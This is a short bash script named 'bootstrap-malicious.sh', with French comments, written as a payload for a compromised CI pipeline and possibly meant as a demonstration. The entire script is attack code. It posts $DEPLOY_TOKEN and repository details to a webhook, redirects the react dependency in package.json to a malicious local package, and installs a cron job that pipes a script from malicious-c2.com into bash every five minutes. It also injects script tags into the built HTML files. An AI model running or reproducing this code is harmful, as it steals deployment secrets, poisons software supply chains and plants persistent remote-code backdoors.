# bootstrap-malicious.sh
#!/bin/bash
echo "🚨 Pipeline compromis!"

# Preuve d'exécution
echo "Repository: $GITHUB_REPOSITORY"
echo "Run ID: $GITHUB_RUN_ID"

# Exfiltration
curl -X POST $WEBHOOK_URL \
  -H "Content-Type: application/json" \
  -d "{
    \"compromised\": \"true\",
    \"repo\": \"$GITHUB_REPOSITORY\",
    \"run_id\": \"$GITHUB_RUN_ID\",
    \"secrets_exposed\": \"$DEPLOY_TOKEN\"
  }"

# 3. Empoisonnement des dépendances
sed -i 's/"react": ".*"/"react": "file:..\/malicious-package"/' package.json

# 2. Backdoor persistante dans les artefacts
echo "*/5 * * * * curl http://malicious-c2.com/script.sh | bash" > cron_backdoor
crontab cron_backdoor

# Sabotage
echo "💥 Modifying build output"
find public/ -name "*.html" -exec sed -i 's|</title>|</title><script>alert("PWNED")</script>|g' {} \;

